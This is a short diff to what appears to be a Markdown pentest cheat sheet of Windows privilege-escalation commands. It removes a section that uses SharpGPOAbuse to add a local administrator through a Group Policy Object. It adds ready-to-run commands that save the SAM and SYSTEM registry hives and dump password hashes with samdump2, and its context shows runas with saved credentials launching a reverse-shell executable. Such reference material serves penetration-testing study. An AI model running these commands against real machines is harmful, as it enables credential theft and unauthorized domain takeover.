@@ -804,17 +804,18 @@ cmdkey /list
 runas /savecred /user:admin C:\Temp\reverse.exe
 ```
 
-### GPO
-#### Check for GpoEditDeleteModifySecurity
-```ps
-Get-GPPermission -Name "Default Domain Policy" -All
-```
-####
-```ps
-.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "Default Domain Policy"
-```
 
 
+#### Backup operator dumpi SAM and SYSTEM
+```ps
+reg save hklm\system system
+```
+```ps
+reg save hklm\sam sam
+```
+```bash
+samdump2 system sam 
+```
   
 </details>
 
